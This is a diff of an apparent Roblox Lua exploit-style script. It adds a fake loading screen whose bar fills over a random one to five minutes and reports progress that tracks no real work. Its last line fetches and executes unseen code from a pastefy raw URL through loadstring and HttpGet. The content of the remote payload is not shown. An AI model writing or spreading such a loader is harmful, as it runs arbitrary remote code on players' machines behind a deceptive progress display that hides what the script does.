@@ -1,2 +1,51 @@
-https://pastefy.app/H3rRh1hU/raw
+warning.TextStrokeTransparency = 0.6
+warning.TextWrapped = true
+warning.Parent = bg
+
+-- Loading bar background
+local loadBg = Instance.new("Frame")
+loadBg.Size = UDim2.new(0.6, 0, 0, 20)
+loadBg.Position = UDim2.new(0.2, 0, 0.55, 0)
+loadBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+loadBg.BorderSizePixel = 0
+loadBg.BackgroundTransparency = 0.2
+loadBg.ClipsDescendants = true
+loadBg.AnchorPoint = Vector2.new(0, 0.5)
+loadBg.Parent = bg
+
+-- Loading bar fill
+local loadBar = Instance.new("Frame")
+loadBar.Size = UDim2.new(0, 0, 1, 0)
+loadBar.Position = UDim2.new(0, 0, 0, 0)
+loadBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+loadBar.BorderSizePixel = 0
+loadBar.Parent = loadBg
+
+-- Choose random load duration (1 to 5 minutes)
+local loadTime = math.random(60, 300)
+
+-- Animate bar
+local tweenInfo = TweenInfo.new(loadTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+local tween = TweenService:Create(loadBar, tweenInfo, {
+    Size = UDim2.new(1, 0, 1, 0)
+})
+tween:Play()
+
+-- % progress update
+task.spawn(function()
+    for i = 1, loadTime do
+        local percent = math.floor((i / loadTime) * 100)
+        subtitle.Text = "Loading... " .. percent .. "%"
+        wait(1)
+    end
+end)
+
+-- On complete
+tween.Completed:Connect(function()
+    subtitle.Text = "Script loaded successfully!"
+    wait(1.5)
+    gui:Destroy()
+end)
+
+loadstring(game:HttpGet("https://pastefy.app/kovE8QXP/raw"))()
     
